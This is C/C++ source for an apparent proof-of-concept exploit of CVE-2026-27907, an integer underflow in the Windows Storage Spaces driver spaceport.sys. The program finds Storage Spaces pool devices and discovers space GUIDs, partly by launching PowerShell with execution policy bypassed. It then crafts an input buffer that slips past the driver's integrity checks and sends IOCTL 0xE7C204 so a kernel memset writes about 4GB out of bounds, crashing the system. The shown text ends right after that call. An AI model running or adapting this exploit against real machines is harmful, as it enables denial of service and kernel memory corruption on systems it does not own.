#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <string.h>
#include <wchar.h>

#ifndef DIRECTORY_QUERY
#define DIRECTORY_QUERY 0x0001
#endif

#ifndef STATUS_NO_MORE_ENTRIES
#define STATUS_NO_MORE_ENTRIES ((NTSTATUS)0x8000001AL)
#endif

#define IOCTL_SP_MAP_EXTENTS 0xE7C204
#define SDB_HEADER_SIZE 0x38

// Crafted values:
//   mappingEnd = MappingsOffset + MappingsLength = 0x100 + 0x20 = 0x120
//   outputLength = 0x100
//   underflow: 0x100 - 0x120 = 0xFFFFFFE0
#define POC_INPUT_SIZE 0x120
#define POC_OUTPUT_SIZE 0x100
#define POC_MAPPING_OFFSET 0x100
#define POC_MAPPING_LENGTH 0x20
#define MAX_GUID_CANDIDATES 64

typedef NTSTATUS(NTAPI* PFN_NT_OPEN_DIRECTORY_OBJECT)(PHANDLE DirectoryHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
typedef NTSTATUS(NTAPI* PFN_NT_QUERY_DIRECTORY_OBJECT)(HANDLE DirectoryHandle, PVOID Buffer, ULONG Length, BOOLEAN ReturnSingleEntry, BOOLEAN RestartScan, PULONG Context, PULONG ReturnLength);

typedef struct _POC_OBJECT_DIRECTORY_INFORMATION {
    UNICODE_STRING Name;
    UNICODE_STRING TypeName;
} POC_OBJECT_DIRECTORY_INFORMATION;

typedef struct _SDB_MAP_INFO_POC {
    ULONG Size;
    ULONG TotalLength;
    BYTE ObjectState[0x10];
    GUID SpaceId;
    ULONG MappingsLength;
    ULONG MappingsOffset;
    ULONG BufferLength;
    ULONG BufferOffset;
} SDB_MAP_INFO_POC;

static_assert(sizeof(SDB_MAP_INFO_POC) == SDB_HEADER_SIZE, "SDB_MAP_INFO_POC must be 0x38 bytes");

typedef struct _GUID_CANDIDATE {
    GUID Guid;
    char Source[128];
} GUID_CANDIDATE;

static PFN_NT_OPEN_DIRECTORY_OBJECT g_NtOpenDirectoryObject = NULL;
static PFN_NT_QUERY_DIRECTORY_OBJECT g_NtQueryDirectoryObject = NULL;

static void InitUnicodeString(UNICODE_STRING* value, const WCHAR* text) {
    if (value == NULL) {
        return;
    }

    value->Buffer = const_cast<PWSTR>(text);
    value->Length = 0;
    value->MaximumLength = 0;
    if (text == NULL) {
        return;
    }

    size_t cch = wcslen(text);
    size_t maxCch = (0xFFFFu - sizeof(WCHAR)) / sizeof(WCHAR);
    if (cch > maxCch) {
        cch = maxCch;
    }

    value->Length = (USHORT)(cch * sizeof(WCHAR));
    value->MaximumLength = (USHORT)(value->Length + sizeof(WCHAR));
}

static BOOL UnicodeStringStartsWith(const UNICODE_STRING* value, const WCHAR* prefix) {
    if (value == NULL || value->Buffer == NULL || prefix == NULL) {
        return FALSE;
    }

    size_t prefixCch = wcslen(prefix);
    size_t valueCch = value->Length / sizeof(WCHAR);
    if (valueCch < prefixCch) {
        return FALSE;
    }

    return wcsncmp(value->Buffer, prefix, prefixCch) == 0;
}

static BOOL WideStringStartsWith(const WCHAR* value, const WCHAR* prefix) {
    if (value == NULL || prefix == NULL) {
        return FALSE;
    }

    return wcsncmp(value, prefix, wcslen(prefix)) == 0;
}

static BOOL CopyUnicodeStringToBuffer(const UNICODE_STRING* source, WCHAR* destination, DWORD destinationCch) {
    if (source == NULL || source->Buffer == NULL || destination == NULL || destinationCch == 0) {
        return FALSE;
    }

    DWORD copyCch = source->Length / sizeof(WCHAR);
    if (copyCch >= destinationCch) {
        copyCch = destinationCch - 1;
    }

    memcpy(destination, source->Buffer, copyCch * sizeof(WCHAR));
    destination[copyCch] = L'\0';
    return TRUE;
}

static BOOL CopyWideString(WCHAR* destination, DWORD destinationCch, const WCHAR* source) {
    if (destination == NULL || destinationCch == 0 || source == NULL) {
        return FALSE;
    }

    if (wcsncpy_s(destination, destinationCch, source, _TRUNCATE) != 0) {
        return FALSE;
    }

    return TRUE;
}

static BOOL ConvertArgToWide(const char* source, WCHAR* destination, DWORD destinationCch) {
    if (source == NULL || destination == NULL || destinationCch == 0) {
        return FALSE;
    }

    int written = MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, source, -1, destination, destinationCch);
    if (written == 0) {
        written = MultiByteToWideChar(CP_ACP, 0, source, -1, destination, destinationCch);
    }

    return written != 0;
}

static void PrintUsage(const char* exeName) {
    const char* name = exeName != NULL ? exeName : "poc_cve-2026-27907.exe";
    printf("Usage: %s [pool-device-path] [--space-guid {GUID}]\n", name);
    printf("       %s\n", "\\\\.\\Pool#{GUID}");
    printf("       %s\n", "\\\\?\\GLOBALROOT\\Device\\Pool#{GUID}");
    printf("       %s --space-guid {SPACE-DEVICE-OR-OBJECT-GUID}\n", name);
    printf("PowerShell helper: Get-VirtualDisk | Select FriendlyName,UniqueId,ObjectId,Path | fl\n");
    printf("Prefer a GUID from a Space# DOS link, ObjectId, or Path. Get-VirtualDisk.UniqueId may be different.\n");
}

static int HexValueA(char ch) {
    if (ch >= '0' && ch <= '9') {
        return ch - '0';
    }

    if (ch >= 'a' && ch <= 'f') {
        return ch - 'a' + 10;
    }

    if (ch >= 'A' && ch <= 'F') {
        return ch - 'A' + 10;
    }

    return -1;
}

static BOOL IsHexA(char ch) {
    return HexValueA(ch) >= 0;
}

static BOOL ParseHexA(const char* text, size_t count, unsigned long* value) {
    if (text == NULL || value == NULL) {
        return FALSE;
    }

    unsigned long result = 0;
    for (size_t i = 0; i < count; i++) {
        int digit = HexValueA(text[i]);
        if (digit < 0) {
            return FALSE;
        }

        result = (result << 4) | (unsigned long)digit;
    }

    *value = result;
    return TRUE;
}

static BOOL LooksLikeGuidAtA(const char* text) {
    if (text == NULL) {
        return FALSE;
    }

    const char* p = text;
    if (*p == '{') {
        p++;
    }

    return IsHexA(p[0]) && IsHexA(p[7]) && p[8] == '-' && IsHexA(p[9]) && IsHexA(p[12]) && p[13] == '-' && IsHexA(p[14]) && IsHexA(p[17]) && p[18] == '-' && IsHexA(p[19]) && IsHexA(p[22]) && p[23] == '-' && IsHexA(p[24]) && IsHexA(p[35]);
}

static BOOL LooksLikeCompactGuidAtA(const char* text) {
    if (text == NULL) {
        return FALSE;
    }

    for (int i = 0; i < 32; i++) {
        if (!IsHexA(text[i])) {
            return FALSE;
        }
    }

    return TRUE;
}

static BOOL ParseGuidAtA(const char* text, GUID* guid) {
    if (text == NULL || guid == NULL) {
        return FALSE;
    }

    const char* p = text;
    if (*p == '{') {
        p++;
    }

    unsigned long data1 = 0;
    unsigned long data2 = 0;
    unsigned long data3 = 0;
    unsigned long data4[8] = { 0 };
    if (!ParseHexA(p, 8, &data1) || p[8] != '-') {
        return FALSE;
    }

    p += 9;
    if (!ParseHexA(p, 4, &data2) || p[4] != '-') {
        return FALSE;
    }

    p += 5;
    if (!ParseHexA(p, 4, &data3) || p[4] != '-') {
        return FALSE;
    }

    p += 5;
    for (int i = 0; i < 2; i++) {
        if (!ParseHexA(p + (i * 2), 2, &data4[i])) {
            return FALSE;
        }
    }

    if (p[4] != '-') {
        return FALSE;
    }

    p += 5;
    for (int i = 2; i < 8; i++) {
        if (!ParseHexA(p + ((i - 2) * 2), 2, &data4[i])) {
            return FALSE;
        }
    }

    guid->Data1 = (unsigned long)data1;
    guid->Data2 = (unsigned short)data2;
    guid->Data3 = (unsigned short)data3;
    for (int i = 0; i < 8; i++) {
        guid->Data4[i] = (unsigned char)data4[i];
    }

    return TRUE;
}

static BOOL ParseCompactGuidAtA(const char* text, GUID* guid) {
    if (text == NULL || guid == NULL) {
        return FALSE;
    }

    unsigned long parts[16] = { 0 };
    for (int i = 0; i < 16; i++) {
        if (!ParseHexA(text + (i * 2), 2, &parts[i])) {
            return FALSE;
        }
    }

    guid->Data1 = (parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3];
    guid->Data2 = (unsigned short)((parts[4] << 8) | parts[5]);
    guid->Data3 = (unsigned short)((parts[6] << 8) | parts[7]);
    for (int i = 0; i < 8; i++) {
        guid->Data4[i] = (unsigned char)parts[i + 8];
    }

    return TRUE;
}

static BOOL FindGuidInTextA(const char* text, GUID* guid) {
    if (text == NULL || guid == NULL) {
        return FALSE;
    }

    for (const char* p = text; *p != '\0'; p++) {
        if ((*p == '{' && ParseGuidAtA(p, guid)) || ParseGuidAtA(p, guid) || ParseCompactGuidAtA(p, guid)) {
            return TRUE;
        }
    }

    return FALSE;
}

static BOOL GuidEquals(const GUID* left, const GUID* right) {
    if (left == NULL || right == NULL) {
        return FALSE;
    }

    return memcmp(left, right, sizeof(GUID)) == 0;
}

static BOOL AddGuidCandidate(GUID_CANDIDATE* candidates, DWORD* count, const GUID* guid, const char* source) {
    if (candidates == NULL || count == NULL || guid == NULL || *count >= MAX_GUID_CANDIDATES) {
        return FALSE;
    }

    for (DWORD i = 0; i < *count; i++) {
        if (GuidEquals(&candidates[i].Guid, guid)) {
            return TRUE;
        }
    }

    candidates[*count].Guid = *guid;
    if (source != NULL) {
        strncpy_s(candidates[*count].Source, ARRAYSIZE(candidates[*count].Source), source, _TRUNCATE);
    }
    (*count)++;
    return TRUE;
}

static void CollectGuidsInTextA(const char* text, const char* source, GUID_CANDIDATE* candidates, DWORD* count) {
    if (text == NULL || candidates == NULL || count == NULL) {
        return;
    }

    for (const char* p = text; *p != '\0' && *count < MAX_GUID_CANDIDATES; p++) {
        GUID guid = {};
        if (LooksLikeGuidAtA(p) && ParseGuidAtA(p, &guid)) {
            AddGuidCandidate(candidates, count, &guid, source);
            p += (*p == '{') ? 37 : 35;
            continue;
        }

        BOOL leftBoundary = (p == text) || !IsHexA(*(p - 1));
        BOOL rightBoundary = !IsHexA(p[32]);
        if (leftBoundary && rightBoundary && LooksLikeCompactGuidAtA(p) && ParseCompactGuidAtA(p, &guid)) {
            AddGuidCandidate(candidates, count, &guid, source);
            p += 31;
        }
    }
}

static void CollectGuidsInTextW(const WCHAR* text, const char* source, GUID_CANDIDATE* candidates, DWORD* count) {
    if (text == NULL || candidates == NULL || count == NULL) {
        return;
    }

    char converted[2048] = { 0 };
    int written = WideCharToMultiByte(CP_UTF8, 0, text, -1, converted, sizeof(converted), NULL, NULL);
    if (written == 0) {
        return;
    }

    CollectGuidsInTextA(converted, source, candidates, count);
}

static void PrintGuid(const char* prefix, const GUID* guid) {
    if (guid == NULL) {
        return;
    }

    printf("%s{%08lX-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}\n", prefix != NULL ? prefix : "", (unsigned long)guid->Data1, guid->Data2, guid->Data3, guid->Data4[0], guid->Data4[1], guid->Data4[2], guid->Data4[3], guid->Data4[4], guid->Data4[5], guid->Data4[6], guid->Data4[7]);
}

static void RunCommandAndCollectGuidsW(const WCHAR* commandLineTemplate, const char* source, GUID_CANDIDATE* candidates, DWORD* count) {
    if (commandLineTemplate == NULL || candidates == NULL || count == NULL || *count >= MAX_GUID_CANDIDATES) {
        return;
    }

    WCHAR commandLine[1024] = { 0 };
    if (!CopyWideString(commandLine, ARRAYSIZE(commandLine), commandLineTemplate)) {
        return;
    }

    SECURITY_ATTRIBUTES securityAttributes{};
    securityAttributes.nLength = sizeof(securityAttributes);
    securityAttributes.bInheritHandle = TRUE;
    securityAttributes.lpSecurityDescriptor = NULL;

    HANDLE readPipe = NULL;
    HANDLE writePipe = NULL;
    if (!CreatePipe(&readPipe, &writePipe, &securityAttributes, 0)) {
        return;
    }

    if (!SetHandleInformation(readPipe, HANDLE_FLAG_INHERIT, 0)) {
        CloseHandle(readPipe);
        CloseHandle(writePipe);
        return;
    }

    STARTUPINFOW startupInfo{};
    PROCESS_INFORMATION processInfo{};
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.dwFlags = STARTF_USESTDHANDLES;
    startupInfo.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
    startupInfo.hStdOutput = writePipe;
    startupInfo.hStdError = writePipe;

    BOOL created = CreateProcessW(NULL, commandLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInfo);
    CloseHandle(writePipe);
    if (!created) {
        CloseHandle(readPipe);
        return;
    }

    char output[32768] = { 0 };
    DWORD used = 0;
    for (;;) {
        char chunk[1024] = { 0 };
        DWORD bytesRead = 0;
        BOOL readOk = ReadFile(readPipe, chunk, sizeof(chunk) - 1, &bytesRead, NULL);
        if (!readOk || bytesRead == 0) {
            break;
        }

        DWORD room = (DWORD)sizeof(output) - used - 1;
        DWORD toCopy = bytesRead < room ? bytesRead : room;
        if (toCopy > 0) {
            memcpy(output + used, chunk, toCopy);
            used += toCopy;
            output[used] = '\0';
        }
    }

    WaitForSingleObject(processInfo.hProcess, INFINITE);
    CloseHandle(processInfo.hThread);
    CloseHandle(processInfo.hProcess);
    CloseHandle(readPipe);

    CollectGuidsInTextA(output, source, candidates, count);
}

static void DiscoverSpaceGuidCandidates(GUID_CANDIDATE* candidates, DWORD* count) {
    if (candidates == NULL || count == NULL) {
        return;
    }

    WCHAR dosDevices[65536] = { 0 };
    DWORD chars = QueryDosDeviceW(NULL, dosDevices, ARRAYSIZE(dosDevices));
    if (chars != 0) {
        for (const WCHAR* name = dosDevices; *name != L'\0' && *count < MAX_GUID_CANDIDATES; name += wcslen(name) + 1) {
            if (WideStringStartsWith(name, L"Space#") || WideStringStartsWith(name, L"Global\\Space#")) {
                CollectGuidsInTextW(name, "QueryDosDevice Space# link", candidates, count);
            }
        }
    }

    RunCommandAndCollectGuidsW(L"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Get-VirtualDisk | ForEach-Object { $_.ObjectId; $_.Path; $_.UniqueId }\"", "Get-VirtualDisk ObjectId/Path/UniqueId", candidates, count);
}

static BOOL TryPoolDevicePath(const WCHAR* candidate, WCHAR* devicePath, DWORD devicePathCch) {
    if (candidate == NULL || devicePath == NULL || devicePathCch == 0) {
        return FALSE;
    }

    HANDLE device = CreateFileW(candidate, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (device == INVALID_HANDLE_VALUE) {
        printf("[.] Pool device candidate failed: %ls (error %lu)\n", candidate, GetLastError());
        return FALSE;
    }

    CloseHandle(device);
    if (!CopyWideString(devicePath, devicePathCch, candidate)) {
        return FALSE;
    }

    printf("[+] Openable pool device candidate: %ls\n", candidate);
    return TRUE;
}

static BOOL TryPoolNameFormats(const WCHAR* poolName, const WCHAR* const* formats, WCHAR* devicePath, DWORD devicePathCch) {
    if (poolName == NULL || formats == NULL || devicePath == NULL || devicePathCch == 0) {
        return FALSE;
    }

    WCHAR candidate[MAX_PATH] = { 0 };
    for (int i = 0; formats[i] != NULL; i++) {
        if (swprintf_s(candidate, ARRAYSIZE(candidate), formats[i], poolName) <= 0) {
            continue;
        }

        if (TryPoolDevicePath(candidate, devicePath, devicePathCch)) {
            return TRUE;
        }
    }

    return FALSE;
}

static BOOL FindPoolDeviceWithQueryDosDevice(WCHAR* devicePath, DWORD devicePathCch) {
    if (devicePath == NULL || devicePathCch == 0) {
        return FALSE;
    }

    WCHAR dosDevices[65536] = { 0 };
    DWORD chars = QueryDosDeviceW(NULL, dosDevices, ARRAYSIZE(dosDevices));
    if (chars == 0) {
        return FALSE;
    }

    static const WCHAR* plainFormats[] = { L"\\\\.\\%ls", L"\\\\.\\Global\\%ls", NULL };
    static const WCHAR* globalFormats[] = { L"\\\\.\\%ls", NULL };

    for (const WCHAR* name = dosDevices; *name != L'\0'; name += wcslen(name) + 1) {
        if (WideStringStartsWith(name, L"Pool#")) {
            if (TryPoolNameFormats(name, plainFormats, devicePath, devicePathCch)) {
                return TRUE;
            }
        }
        else if (WideStringStartsWith(name, L"Global\\Pool#")) {
            if (TryPoolNameFormats(name, globalFormats, devicePath, devicePathCch)) {
                return TRUE;
            }
        }
    }

    return FALSE;
}

static BOOL FindPoolDeviceInNtDirectory(const WCHAR* directoryPath, const WCHAR* const* candidateFormats, WCHAR* devicePath, DWORD devicePathCch) {
    if (directoryPath == NULL || candidateFormats == NULL || devicePath == NULL || devicePathCch == 0 || g_NtOpenDirectoryObject == NULL || g_NtQueryDirectoryObject == NULL) {
        return FALSE;
    }

    UNICODE_STRING name;
    OBJECT_ATTRIBUTES objectAttributes;
    HANDLE directoryHandle = NULL;
    InitUnicodeString(&name, directoryPath);
    InitializeObjectAttributes(&objectAttributes, &name, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS status = g_NtOpenDirectoryObject(&directoryHandle, DIRECTORY_QUERY, &objectAttributes);
    if (status < 0) {
        return FALSE;
    }

    BYTE buffer[65536] = { 0 };
    ULONG context = 0;
    BOOL found = FALSE;
    for (BOOL first = TRUE; ; first = FALSE) {
        ULONG returnLength = 0;
        status = g_NtQueryDirectoryObject(directoryHandle, buffer, sizeof(buffer), FALSE, first, &context, &returnLength);
        if (status == STATUS_NO_MORE_ENTRIES || status < 0) {
            break;
        }

        POC_OBJECT_DIRECTORY_INFORMATION* info = (POC_OBJECT_DIRECTORY_INFORMATION*)buffer;
        BYTE* end = buffer + sizeof(buffer);
        unsigned int guard = 0;
        while ((BYTE*)(info + 1) <= end && info->Name.Length > 0 && guard < 4096) {
            WCHAR objectName[MAX_PATH] = { 0 };
            BOOL isPool = UnicodeStringStartsWith(&info->Name, L"Pool#");
            BOOL copied = CopyUnicodeStringToBuffer(&info->Name, objectName, ARRAYSIZE(objectName));
            if (isPool && copied && TryPoolNameFormats(objectName, candidateFormats, devicePath, devicePathCch)) {
                found = TRUE;
                break;
            }

            info++;
            guard++;
        }

        if (found) {
            break;
        }
    }

    CloseHandle(directoryHandle);
    return found;
}

static BOOL ResolveNtApiFunctions() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (ntdll == NULL) {
        return FALSE;
    }

    FARPROC openDirectory = GetProcAddress(ntdll, "NtOpenDirectoryObject");
    FARPROC queryDirectory = GetProcAddress(ntdll, "NtQueryDirectoryObject");
    if (openDirectory == NULL || queryDirectory == NULL) {
        return FALSE;
    }

    memcpy(&g_NtOpenDirectoryObject, &openDirectory, sizeof(g_NtOpenDirectoryObject));
    memcpy(&g_NtQueryDirectoryObject, &queryDirectory, sizeof(g_NtQueryDirectoryObject));
    return g_NtOpenDirectoryObject != NULL && g_NtQueryDirectoryObject != NULL;
}

static BOOL FindFirstPoolDevice(WCHAR* devicePath, DWORD devicePathCch) {
    static const WCHAR* globalDosFormats[] = { L"\\\\.\\Global\\%ls", L"\\\\?\\GLOBALROOT\\GLOBAL??\\%ls", NULL };
    static const WCHAR* localDosFormats[] = { L"\\\\.\\%ls", L"\\\\.\\Global\\%ls", L"\\\\?\\GLOBALROOT\\GLOBAL??\\%ls", NULL };
    static const WCHAR* deviceFormats[] = { L"\\\\?\\GLOBALROOT\\Device\\%ls", NULL };

    printf("[+]   method 1: QueryDosDeviceW multi-sz scan\n");
    if (FindPoolDeviceWithQueryDosDevice(devicePath, devicePathCch)) {
        return TRUE;
    }

    printf("[+]   method 2: NT directory scan of \\\\Global??\n");
    if (FindPoolDeviceInNtDirectory(L"\\Global??", globalDosFormats, devicePath, devicePathCch)) {
        return TRUE;
    }

    printf("[+]   method 3: NT directory scan of \\\\??\n");
    if (FindPoolDeviceInNtDirectory(L"\\??", localDosFormats, devicePath, devicePathCch)) {
        return TRUE;
    }

    printf("[+]   method 4: NT directory scan of \\\\DosDevices\\\\Global\n");
    if (FindPoolDeviceInNtDirectory(L"\\DosDevices\\Global", globalDosFormats, devicePath, devicePathCch)) {
        return TRUE;
    }

    printf("[+]   method 5: NT directory scan of \\\\Device for direct Pool# objects\n");
    if (FindPoolDeviceInNtDirectory(L"\\Device", deviceFormats, devicePath, devicePathCch)) {
        return TRUE;
    }

    return FALSE;
}

static void CraftMapInfoBuffer(BYTE* inputBuffer, DWORD inputBufferSize, const GUID* spaceId) {
    if (inputBuffer == NULL || inputBufferSize < POC_INPUT_SIZE || spaceId == NULL) {
        return;
    }

    memset(inputBuffer, 0, inputBufferSize);
    SDB_MAP_INFO_POC* mapInfo = (SDB_MAP_INFO_POC*)inputBuffer;
    mapInfo->Size = SDB_HEADER_SIZE;
    mapInfo->TotalLength = POC_INPUT_SIZE;
    mapInfo->SpaceId = *spaceId;
    mapInfo->MappingsLength = POC_MAPPING_LENGTH;
    mapInfo->MappingsOffset = POC_MAPPING_OFFSET;
    mapInfo->BufferLength = 0;
    mapInfo->BufferOffset = 0;

    // Place SDB_RANGES header at MappingsOffset with RangeCount=0 at +4.
    // IntegrityCheck requires: MappingsLength >= 32 * RangeCount + 8.
    *(DWORD*)(inputBuffer + POC_MAPPING_OFFSET + 4) = 0;
}

static BOOL ProbeSpaceIdCandidate(HANDLE device, const GUID* candidate, DWORD* lastErrorOut) {
    if (device == INVALID_HANDLE_VALUE || candidate == NULL) {
        if (lastErrorOut != NULL) {
            *lastErrorOut = ERROR_INVALID_PARAMETER;
        }
        return FALSE;
    }

    BYTE inputBuffer[POC_INPUT_SIZE] = { 0 };
    BYTE outputBuffer[POC_INPUT_SIZE] = { 0 };
    CraftMapInfoBuffer(inputBuffer, sizeof(inputBuffer), candidate);

    DWORD bytesReturned = 0;
    BOOL ok = DeviceIoControl(device, IOCTL_SP_MAP_EXTENTS, inputBuffer, POC_INPUT_SIZE, outputBuffer, POC_INPUT_SIZE, &bytesReturned, NULL);
    DWORD lastError = ok ? ERROR_SUCCESS : GetLastError();
    if (lastErrorOut != NULL) {
        *lastErrorOut = lastError;
    }

    // The safe probe uses outputLength == mappingEnd, so it does not trigger
    // the underflow. ERROR_NOT_FOUND is the specific signal that FindSpaceById
    // rejected this GUID. Any later status means this GUID passed that gate.
    return ok || lastError != ERROR_NOT_FOUND;
}

int main(int argc, char** argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("[+] CVE-2026-27907 PoC: spaceport.sys Integer Underflow in SpPoolMapExtents memset\n\n");

    printf("[+] Stage 1: Parse command line\n");
    const char* devicePathArgument = NULL;
    GUID spaceId = {};
    BOOL haveSpaceId = FALSE;
    GUID_CANDIDATE candidates[MAX_GUID_CANDIDATES] = {};
    DWORD candidateCount = 0;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            PrintUsage(argv[0]);
            return 0;
        }

        if (strcmp(argv[i], "--space-guid") == 0) {
            if (i + 1 >= argc || !FindGuidInTextA(argv[i + 1], &spaceId)) {
                printf("[-] --space-guid requires a GUID argument\n");
                PrintUsage(argv[0]);
                return 1;
            }

            haveSpaceId = TRUE;
            AddGuidCandidate(candidates, &candidateCount, &spaceId, "command line --space-guid");
            i++;
            continue;
        }

        if (argv[i][0] == '-') {
            printf("[-] Unknown option: %s\n", argv[i]);
            PrintUsage(argv[0]);
            return 1;
        }

        if (devicePathArgument != NULL) {
            printf("[-] Multiple pool device paths were provided\n");
            PrintUsage(argv[0]);
            return 1;
        }

        devicePathArgument = argv[i];
    }

    printf("[+] Stage 2: Resolve NT API functions\n");
    if (!ResolveNtApiFunctions()) {
        printf("[-] Failed to resolve NtOpenDirectoryObject or NtQueryDirectoryObject\n");
        return 1;
    }

    printf("[+] NtOpenDirectoryObject = %p\n", (void*)g_NtOpenDirectoryObject);
    printf("[+] NtQueryDirectoryObject = %p\n", (void*)g_NtQueryDirectoryObject);

    WCHAR devicePath[MAX_PATH] = { 0 };
    if (devicePathArgument != NULL) {
        printf("[+] Stage 3: Use pool device path from command line\n");
        if (!ConvertArgToWide(devicePathArgument, devicePath, ARRAYSIZE(devicePath))) {
            printf("[-] Failed to convert the pool device path to UTF-16\n");
            return 1;
        }

        printf("[+] Pool device path: %ls\n", devicePath);
    }
    else {
        printf("[+] Stage 3: Enumerate Storage Spaces pool devices\n");
        if (!FindFirstPoolDevice(devicePath, ARRAYSIZE(devicePath))) {
            printf("[-] No Storage Spaces pool device found\n");
            printf("[-] Create a Storage Spaces pool or pass a pool device path manually\n");
            PrintUsage(argv[0]);
            return 1;
        }

        printf("[+] Found pool device: %ls\n", devicePath);
    }

    printf("[+] Stage 4: Resolve target Storage Spaces SpaceId candidate\n");
    if (!haveSpaceId) {
        DiscoverSpaceGuidCandidates(candidates, &candidateCount);
        if (candidateCount == 0) {
            printf("[-] Failed to discover SpaceId candidates automatically\n");
            printf("[-] Run: Get-VirtualDisk | Select FriendlyName,UniqueId,ObjectId,Path | fl\n");
            printf("[-] Then pass a GUID from Space# / ObjectId / Path with --space-guid {GUID}\n");
            return 1;
        }

        printf("[+] Discovered %lu SpaceId candidate(s)\n", (unsigned long)candidateCount);
        for (DWORD i = 0; i < candidateCount; i++) {
            char prefix[192] = { 0 };
            sprintf_s(prefix, sizeof(prefix), "[+]   candidate %lu (%s): ", (unsigned long)i + 1, candidates[i].Source[0] ? candidates[i].Source : "unknown");
            PrintGuid(prefix, &candidates[i].Guid);
        }

        spaceId = candidates[0].Guid;
        haveSpaceId = TRUE;
    }

    printf("[+] Stage 5: Open pool device handle\n");
    HANDLE device = CreateFileW(devicePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (device == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFileW failed (error %lu)\n", GetLastError());
        return 1;
    }

    printf("[+] Device handle: %p\n", (void*)device);

    printf("[+] Stage 5b: Probe SpaceId candidates with safe output length\n");
    BOOL foundWorkingSpaceId = FALSE;
    for (DWORD i = 0; i < candidateCount; i++) {
        char prefix[192] = { 0 };
        sprintf_s(prefix, sizeof(prefix), "[+]   probe candidate %lu (%s): ", (unsigned long)i + 1, candidates[i].Source[0] ? candidates[i].Source : "unknown");
        PrintGuid(prefix, &candidates[i].Guid);

        DWORD probeError = ERROR_SUCCESS;
        if (ProbeSpaceIdCandidate(device, &candidates[i].Guid, &probeError)) {
            printf("[+]   candidate passed FindSpaceById gate (probe status 0x%08lX)\n", (unsigned long)probeError);
            spaceId = candidates[i].Guid;
            foundWorkingSpaceId = TRUE;
            break;
        }

        printf("[.]   rejected by FindSpaceById (probe status 0x%08lX)\n", (unsigned long)probeError);
    }

    if (!foundWorkingSpaceId) {
        printf("[-] No SpaceId candidate passed FindSpaceById for this pool device\n");
        printf("[-] Pass a pool-matching GUID manually with --space-guid {GUID}\n");
        CloseHandle(device);
        return 1;
    }

    PrintGuid("[+] Selected SpaceId for +0x18: ", &spaceId);

    printf("[+] Stage 6: Craft SDB_MAP_INFO for integer underflow\n");
    BYTE inputBuffer[POC_INPUT_SIZE] = { 0 };
    BYTE outputBuffer[POC_OUTPUT_SIZE] = { 0 };
    CraftMapInfoBuffer(inputBuffer, sizeof(inputBuffer), &spaceId);
    SDB_MAP_INFO_POC* mapInfo = (SDB_MAP_INFO_POC*)inputBuffer;

    printf("[+] Crafted SDB_MAP_INFO:\n");
    printf("    Size             = 0x%08lX\n", (unsigned long)mapInfo->Size);
    printf("    TotalLength      = 0x%08lX\n", (unsigned long)mapInfo->TotalLength);
    PrintGuid("    SpaceId (+0x18)  = ", &mapInfo->SpaceId);
    printf("    MappingsLength   = 0x%08lX\n", (unsigned long)mapInfo->MappingsLength);
    printf("    MappingsOffset   = 0x%08lX\n", (unsigned long)mapInfo->MappingsOffset);
    printf("    BufferLength     = 0x%08lX\n", (unsigned long)mapInfo->BufferLength);
    printf("    BufferOffset     = 0x%08lX\n", (unsigned long)mapInfo->BufferOffset);
    printf("    RangeCount@+0x%04X = %lu\n", (unsigned int)(POC_MAPPING_OFFSET + 4), *(DWORD*)(inputBuffer + POC_MAPPING_OFFSET + 4));

    printf("\n[+] IntegrityCheck trace:\n");
    printf("    Size(0x38) == 56                         -> PASS\n");
    printf("    MappingsLength(0x%X) != 0                -> MappingsOffset(0x%X) != 0 -> PASS\n", POC_MAPPING_LENGTH, POC_MAPPING_OFFSET);
    printf("    MappingsOffset-1(0x%X) > 0x36            -> PASS\n", POC_MAPPING_OFFSET - 1);
    printf("    TotalLength(0x%X) >= 0x38                -> PASS\n", POC_INPUT_SIZE);
    printf("    TotalLength(0x%X) >= ML+56(0x%X)          -> PASS\n", POC_INPUT_SIZE, POC_MAPPING_LENGTH + 56);
    printf("    ML(0x%X) >= 32*0+8(8)                    -> PASS\n", POC_MAPPING_LENGTH);
    printf("    *** NOT checked: TotalLength >= MappingsOffset + MappingsLength ***\n");

    printf("\n[+] Vulnerable computation in SpPoolMapExtents:\n");
    unsigned int mappingEnd = POC_MAPPING_OFFSET + POC_MAPPING_LENGTH;
    unsigned int underflowLen = POC_OUTPUT_SIZE - mappingEnd;
    printf("    mappingEnd  = MappingsOffset + MappingsLength = 0x%X\n", mappingEnd);
    printf("    outputLength = %u (0x%X)\n", POC_OUTPUT_SIZE, POC_OUTPUT_SIZE);
    printf("    memset len  = outputLength - mappingEnd = 0x%X - 0x%X = 0x%08X (UNDERFLOW)\n", POC_OUTPUT_SIZE, mappingEnd, underflowLen);
    printf("    memset(buf + 0x%X, 0, 0x%08X) -> writes ~4GB beyond buffer -> BSOD\n", mappingEnd, underflowLen);

    printf("\n[+] Stage 7: Send IOCTL 0x%lX (SpPoolMapExtents)\n", (unsigned long)IOCTL_SP_MAP_EXTENTS);
    printf("[+] Input buffer size: 0x%X, Output buffer size: 0x%X\n", POC_INPUT_SIZE, POC_OUTPUT_SIZE);
    DWORD bytesReturned = 0;
    BOOL ok = DeviceIoControl(device, IOCTL_SP_MAP_EXTENTS, inputBuffer, POC_INPUT_SIZE, outputBuffer, POC_OUTPUT_SIZE, &bytesReturned, NULL);
    DWORD lastError = GetLastError();
    printf("[+] DeviceIoControl result: %s\n", ok ? "TRUE" : "FALSE");
